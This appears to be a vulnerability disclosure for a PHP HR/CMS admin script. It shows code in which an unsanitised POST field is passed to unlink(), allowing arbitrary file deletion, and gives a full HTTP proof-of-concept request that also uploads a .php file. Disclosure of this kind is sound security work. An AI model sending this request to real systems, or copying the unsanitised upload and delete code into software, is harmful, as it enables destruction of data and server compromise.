@@ -1,0 +1,73 @@
+### Vulnerability file address
+
+In line 19 of `admin/Operation/User.php`, `@unlink("../../assets/uploadImage/Candidate/" . $_POST['old_website_image']);`,` $_POST['old_website_image']` parameters have not been restricted, which causes any file to be deleted
+
+```php
+<?php
+error_reporting(0);
+session_start();
+if (isset($_SESSION['logged']) && $_SESSION['logged'] == "1" && $_SESSION['role'] == "admin") {
+
+  require_once('../../assets/constants/config.php');
+
+  try {
+    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
+    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
+    if (isset($_POST['btn_save'])) {
+      $target_dir = "../../assets/uploadImage/Candidate/";
+      $website_logo = basename($_FILES["website_image"]["name"]);
+      if ($_FILES["website_image"]["tmp_name"] != '') {
+        $image = $target_dir . basename($_FILES["website_image"]["name"]);
+        if (move_uploaded_file($_FILES["website_image"]["tmp_name"], $image)) {
+
+          @unlink("../../assets/uploadImage/Candidate/" . $_POST['old_website_image']);
+        } else {
+          echo "Sorry, there was an error uploading your file.";
+        }
+      } else {
+        $website_logo = $_POST['old_website_image'];
+      }
+```
+
+### POC
+
+```http
+POST /CMS/php/_hr_soft/admin/Operation/User.php HTTP/1.1
+Host: 10.0.0.20:82
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Cookie: PHPSESSID=81293i00fqra5g881e77or40t2
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzedIXtWMMNgQ2ylc
+Content-Length: 375
+
+------WebKitFormBoundaryzedIXtWMMNgQ2ylc
+Content-Disposition: form-data; name="btn_save"
+
+1
+------WebKitFormBoundaryzedIXtWMMNgQ2ylc
+Content-Disposition: form-data; name="website_image";filename="8881.php"
+
+123
+------WebKitFormBoundaryzedIXtWMMNgQ2ylc
+Content-Disposition: form-data; name="old_website_image"
+
+test.txt
+------WebKitFormBoundaryzedIXtWMMNgQ2ylc--
+
+```
+
+### Attack results pictures
+
+![image-20250130212617290](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501302126374.png)
+
+
+
+![image-20250130215429415](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501302154446.png)
+
+![image-20250130215420216](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501302154262.png)
+
